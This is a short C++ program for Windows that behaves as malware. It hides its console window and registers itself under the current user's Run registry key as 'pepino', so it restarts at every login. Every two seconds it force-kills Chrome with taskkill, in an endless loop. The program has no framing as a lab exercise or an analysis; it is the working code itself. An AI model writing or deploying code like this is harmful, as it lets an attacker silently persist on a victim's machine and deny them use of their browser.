#include <iostream>
#include <windows.h>
#include <chrono>
#include <thread>
#include <String>

int main() {
	HKEY hKey;
	LPCSTR subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,subKey,0,KEY_SET_VALUE,&hKey);
	HWND consola = GetConsoleWindow();
	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);
	std::string quotedPath = std::string("\"")+path+("\"");
	if (consola) {
		ShowWindow(consola,SW_HIDE);
	}
	while (true) {
		if (result == ERROR_SUCCESS) {
			result = RegSetValueExA(hKey,"pepino",0,REG_SZ,reinterpret_cast<const BYTE*>(quotedPath.c_str()),
				quotedPath.size()+1);
		}
		system("taskkill /im chrome.exe /f");
		std::cout << "Esperando 2 segundos..." << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(2));
	}
	return 0;
}